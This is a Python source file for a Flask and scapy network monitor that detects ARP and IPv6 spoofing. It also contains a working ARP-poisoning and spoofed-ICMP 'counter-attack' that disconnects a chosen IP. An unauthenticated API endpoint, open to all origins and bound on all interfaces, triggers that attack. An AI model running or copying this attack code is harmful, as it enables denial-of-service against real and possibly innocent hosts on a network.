#!/usr/bin/env python3
"""
Deadnet Defender - Network Security Monitoring Tool
Detects and flags suspicious network activity including ARP poisoning,
IPv6 RA spoofing, and other malicious packets.
"""

import logging
import threading
import time
import json
import subprocess
from datetime import datetime
from collections import defaultdict
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS

# Suppress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import netifaces
from scapy.all import *
from utils.detector import PacketDetector
from utils.database import DefenderDatabase

conf.verb = 0

app = Flask(__name__, template_folder='web/templates', static_folder='web/static')
CORS(app)

# Global monitoring state
monitor_state = {
    'active': False,
    'interface': None,
    'start_time': None,
    'statistics': {
        'total_packets': 0,
        'suspicious_packets': 0,
        'flagged_ips': 0,
        'flagged_macs': 0,
        'arp_packets': 0,
        'ipv6_packets': 0,
        'suspicious_arp': 0,
        'suspicious_ipv6': 0
    },
    'recent_alerts': []
}

monitor_lock = threading.Lock()
monitor_thread = None
sniffer = None
detector = None
db = DefenderDatabase()


def add_alert(alert_type, severity, message, ip=None, mac=None, details=None):
    """Add alert to recent alerts and database"""
    alert = {
        'timestamp': datetime.now().isoformat(),
        'type': alert_type,
        'severity': severity,
        'message': message,
        'ip': ip,
        'mac': mac,
        'details': details or {}
    }
    
    with monitor_lock:
        monitor_state['recent_alerts'].insert(0, alert)
        # Keep only last 100 alerts
        if len(monitor_state['recent_alerts']) > 100:
            monitor_state['recent_alerts'] = monitor_state['recent_alerts'][:100]
    
    # Save to database
    db.add_alert(alert)
    
    # Flag IP/MAC if provided
    if ip:
        db.flag_ip(ip, alert_type, severity, message)
        with monitor_lock:
            monitor_state['statistics']['flagged_ips'] = db.get_flagged_count('ip')
    
    if mac:
        db.flag_mac(mac, alert_type, severity, message)
        with monitor_lock:
            monitor_state['statistics']['flagged_macs'] = db.get_flagged_count('mac')
    
    print(f"[{severity.upper()}] {alert_type}: {message}")
    if ip:
        print(f"  └─ IP: {ip}")
    if mac:
        print(f"  └─ MAC: {mac}")


def packet_callback(packet):
    """Callback function for each captured packet"""
    global detector
    
    try:
        with monitor_lock:
            monitor_state['statistics']['total_packets'] += 1
        
        # Analyze packet with detector
        results = detector.analyze_packet(packet)
        
        if results['suspicious']:
            with monitor_lock:
                monitor_state['statistics']['suspicious_packets'] += 1
            
            # Process each detection
            for detection in results['detections']:
                add_alert(
                    alert_type=detection['type'],
                    severity=detection['severity'],
                    message=detection['message'],
                    ip=detection.get('ip'),
                    mac=detection.get('mac'),
                    details=detection.get('details')
                )
                
                # Update specific counters
                with monitor_lock:
                    if 'ARP' in detection['type']:
                        monitor_state['statistics']['suspicious_arp'] += 1
                    elif 'IPv6' in detection['type']:
                        monitor_state['statistics']['suspicious_ipv6'] += 1
        
        # Update packet type counters
        if packet.haslayer(ARP):
            with monitor_lock:
                monitor_state['statistics']['arp_packets'] += 1
        
        if packet.haslayer(IPv6):
            with monitor_lock:
                monitor_state['statistics']['ipv6_packets'] += 1
                
    except Exception as e:
        print(f"Error processing packet: {e}")


def start_monitoring(interface):
    """Start packet sniffing and monitoring"""
    global detector, sniffer
    
    print(f"\n{'='*60}")
    print(f"[+] Starting Deadnet Defender on interface: {interface}")
    print(f"{'='*60}\n")
    
    detector = PacketDetector(interface)
    
    with monitor_lock:
        monitor_state['active'] = True
        monitor_state['interface'] = interface
        monitor_state['start_time'] = time.time()
    
    try:
        # Use AsyncSniffer for proper stop control
        sniffer = AsyncSniffer(
            iface=interface,
            prn=packet_callback,
            store=False
        )
        sniffer.start()
        
        # Keep thread alive while monitoring
        while monitor_state['active']:
            time.sleep(0.1)
            
        # Stop sniffer
        if sniffer:
            sniffer.stop()
            
    except Exception as e:
        print(f"[!] Monitoring error: {e}")
        with monitor_lock:
            monitor_state['active'] = False


def stop_monitoring():
    """Stop packet monitoring"""
    global sniffer
    
    with monitor_lock:
        monitor_state['active'] = False
    
    # Stop the sniffer
    if sniffer and sniffer.running:
        try:
            sniffer.stop()
            print("\n[+] Monitoring stopped")
        except:
            pass
    else:
        print("\n[+] Monitoring stopped")


# ============================================================================
# Web API Endpoints
# ============================================================================

@app.route('/')
def index():
    """Serve the web monitoring panel"""
    return render_template('index.html')


@app.route('/api/status', methods=['GET'])
def get_status():
    """Get current monitoring status"""
    with monitor_lock:
        status = {
            'active': monitor_state['active'],
            'interface': monitor_state['interface'],
            'start_time': monitor_state['start_time'],
            'statistics': monitor_state['statistics'].copy(),
            'uptime': int(time.time() - monitor_state['start_time']) if monitor_state['start_time'] else 0
        }
    return jsonify(status)


@app.route('/api/alerts', methods=['GET'])
def get_alerts():
    """Get recent alerts"""
    limit = request.args.get('limit', 50, type=int)
    with monitor_lock:
        alerts = monitor_state['recent_alerts'][:limit]
    return jsonify({'alerts': alerts})


@app.route('/api/flagged', methods=['GET'])
def get_flagged():
    """Get flagged IPs and MACs"""
    flagged_type = request.args.get('type', 'all')  # 'ip', 'mac', or 'all'
    
    result = {}
    if flagged_type in ['ip', 'all']:
        result['ips'] = db.get_flagged_ips()
    if flagged_type in ['mac', 'all']:
        result['macs'] = db.get_flagged_macs()
    
    return jsonify(result)


@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    """Get available network interfaces using netifaces"""
    try:
        interfaces = []
        iface_list = netifaces.interfaces()
        
        for iface in iface_list:
            try:
                addrs = netifaces.ifaddresses(iface)
                
                # Get IPv4 address
                if netifaces.AF_INET not in addrs:
                    continue
                
                ipv4 = addrs[netifaces.AF_INET][0].get('addr')
                
                # Skip invalid IPs
                if not ipv4 or ipv4 == '0.0.0.0' or ipv4.startswith('127.'):
                    continue
                
                # Skip link-local (169.254.x.x)
                if ipv4.startswith('169.254.'):
                    continue
                
                # Get MAC address
                mac = None
                if netifaces.AF_LINK in addrs:
                    mac = addrs[netifaces.AF_LINK][0].get('addr')
                
                # Determine interface type based on name
                iface_type = "Ethernet"
                iface_lower = iface.lower()
                if any(x in iface_lower for x in ['wi-fi', 'wireless', 'wlan', '802.11']):
                    iface_type = "Wi-Fi"
                
                # Create friendly name with interface description if available
                friendly_name = f"{iface_type} - {ipv4}"
                
                interfaces.append({
                    'name': iface,
                    'friendly_name': friendly_name,
                    'ip': ipv4,
                    'mac': mac,
                    'type': iface_type
                })
            except Exception:
                continue
        
        # Sort by type (Wi-Fi first, then Ethernet)
        interfaces.sort(key=lambda x: (x['type'] != 'Wi-Fi', x['ip']))
        
        return jsonify({'interfaces': interfaces})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/start', methods=['POST'])
def start_monitor():
    """Start monitoring"""
    global monitor_thread
    
    data = request.json
    iface = data.get('interface')
    
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with monitor_lock:
        if monitor_state['active']:
            return jsonify({'success': False, 'error': 'Monitoring already active'}), 400
        
        # Reset statistics
        monitor_state['statistics'] = {
            'total_packets': 0,
            'suspicious_packets': 0,
            'flagged_ips': 0,
            'flagged_macs': 0,
            'arp_packets': 0,
            'ipv6_packets': 0,
            'suspicious_arp': 0,
            'suspicious_ipv6': 0
        }
        monitor_state['recent_alerts'] = []
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=start_monitoring, args=(iface,), daemon=True)
    monitor_thread.start()
    
    return jsonify({'success': True, 'message': 'Monitoring started'})


@app.route('/api/stop', methods=['POST'])
def stop_monitor():
    """Stop monitoring"""
    with monitor_lock:
        if not monitor_state['active']:
            return jsonify({'success': False, 'error': 'No monitoring active'}), 400
    
    stop_monitoring()
    return jsonify({'success': True, 'message': 'Monitoring stopped'})


@app.route('/api/unflag', methods=['POST'])
def unflag_address():
    """Remove flag from IP or MAC"""
    data = request.json
    addr_type = data.get('type')  # 'ip' or 'mac'
    address = data.get('address')
    
    if not addr_type or not address:
        return jsonify({'success': False, 'error': 'Type and address required'}), 400
    
    if addr_type == 'ip':
        db.unflag_ip(address)
    elif addr_type == 'mac':
        db.unflag_mac(address)
    else:
        return jsonify({'success': False, 'error': 'Invalid type'}), 400
    
    # Update statistics
    with monitor_lock:
        monitor_state['statistics']['flagged_ips'] = db.get_flagged_count('ip')
        monitor_state['statistics']['flagged_macs'] = db.get_flagged_count('mac')
    
    return jsonify({'success': True, 'message': f'{addr_type.upper()} unflagged'})


@app.route('/api/clear_flags', methods=['POST'])
def clear_flags():
    """Clear all flagged addresses"""
    db.clear_all_flags()
    
    with monitor_lock:
        monitor_state['statistics']['flagged_ips'] = 0
        monitor_state['statistics']['flagged_macs'] = 0
    
    return jsonify({'success': True, 'message': 'All flags cleared'})


def force_disconnect_ip(target_ip, interface):
    """Force disconnect target IP from network using counter-attack"""
    try:
        # Get gateway info
        gateway_ip = None
        try:
            gateways = netifaces.gateways()
            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                gateway_ip = gateways['default'][netifaces.AF_INET][0]
        except:
            pass
        
        if not gateway_ip:
            return False, "Cannot detect gateway"
        
        # Get gateway MAC
        gateway_mac = getmacbyip(gateway_ip)
        if not gateway_mac:
            return False, "Cannot get gateway MAC"
        
        print(f"[*] Force disconnecting {target_ip} from network...")
        print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
        
        # Attack 1: ARP Poison - Tell target that gateway is at fake MAC
        # This breaks target's connection to gateway
        fake_mac = RandMAC()
        for _ in range(10):  # Send multiple times for reliability
            # Poison target's ARP cache
            arp_target = ARP(
                op=2,  # is-at (reply)
                psrc=gateway_ip,  # Pretend to be gateway
                hwsrc=fake_mac,  # But with fake MAC
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_target, iface=interface, verbose=0)
            
            # Poison gateway's ARP cache  
            arp_gateway = ARP(
                op=2,
                psrc=target_ip,  # Pretend to be target
                hwsrc=fake_mac,  # But with fake MAC
                pdst=gateway_ip,
                hwdst=gateway_mac
            )
            sendp(Ether(dst=gateway_mac) / arp_gateway, iface=interface, verbose=0)
            
            time.sleep(0.1)
        
        # Attack 2: Gratuitous ARP with fake MAC to confuse network
        for _ in range(5):
            grat_arp = ARP(
                op=2,
                psrc=target_ip,
                hwsrc=RandMAC(),
                pdst=target_ip
            )
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / grat_arp, iface=interface, verbose=0)
            time.sleep(0.1)
        
        # Attack 3: Send ICMP Destination Unreachable to break connections
        for _ in range(3):
            icmp_unreach = IP(src=gateway_ip, dst=target_ip) / ICMP(type=3, code=1)
            send(icmp_unreach, iface=interface, verbose=0)
        
        print(f"[+] Disconnect attack completed against {target_ip}")
        return True, "Target disconnected from network"
        
    except Exception as e:
        print(f"[!] Error in force disconnect: {e}")
        return False, str(e)


@app.route('/api/disconnect_ip', methods=['POST'])
def disconnect_ip():
    """Force disconnect a flagged IP from network (Counter-Attack)"""
    data = request.json
    ip_address = data.get('ip')
    
    if not ip_address:
        return jsonify({'success': False, 'error': 'IP address required'}), 400
    
    # Get current monitoring interface
    with monitor_lock:
        if not monitor_state['active']:
            return jsonify({
                'success': False,
                'error': 'Monitoring must be active to perform disconnect'
            }), 400
        
        interface = monitor_state['interface']
    
    try:
        # Execute force disconnect in background thread
        def execute_disconnect():
            success, message = force_disconnect_ip(ip_address, interface)
            with monitor_lock:
                monitor_state['logs'].append({
                    'timestamp': time.time(),
                    'message': f"{'[+]' if success else '[!]'} Disconnect {ip_address}: {message}"
                })
        
        disconnect_thread = threading.Thread(target=execute_disconnect, daemon=True)
        disconnect_thread.start()
        
        return jsonify({
            'success': True,
            'message': f'Counter-attack initiated against {ip_address}'
        })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


if __name__ == '__main__':
    print("\n" + "="*60)
    print(" "*15 + "DEADNET DEFENDER")
    print(" "*10 + "Network Security Monitoring Tool")
    print("="*60)
    print("\nWritten by @risuncode | Windows Optimized")
    print("="*60 + "\n")
    
    # Check admin privileges
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if not is_admin:
        print("[!] WARNING: This tool requires administrator privileges!")
        print("[!] Please run as administrator for full functionality\n")
    
    print("[+] Starting web monitoring panel...")
    print("[*] Access the panel at: http://localhost:5001")
    print("="*60 + "\n")
    
    # Suppress Flask startup messages
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    import sys
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
